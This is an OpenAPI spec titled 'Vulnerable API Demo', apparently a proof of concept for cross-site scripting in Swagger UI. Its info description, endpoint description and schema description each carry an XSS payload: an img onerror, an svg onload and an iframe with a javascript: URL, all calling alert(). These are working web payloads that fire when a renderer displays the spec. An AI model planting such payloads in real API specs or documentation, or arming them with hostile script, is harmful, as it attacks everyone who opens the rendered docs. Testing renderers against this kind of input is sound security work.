openapi: 3.0.0
info:
  title: Vulnerable API Demo
  description: "<img src=x onerror=alert('XSS in Swagger UI')>"
  version: "1.0.0"

paths:
  /test:
    get:
      summary: Test endpoint
      description: "<svg/onload=alert('XSS via description')>"
      responses:
        '200':
          description: Successful response
          content:
            application/json:
              schema:
                type: object
                properties:
                  message:
                    type: string
                    example: "Hello World"

components:
  schemas:
    EvilSchema:
      type: object
      description: "<iframe src=javascript:alert('XSS via schema')></iframe>"
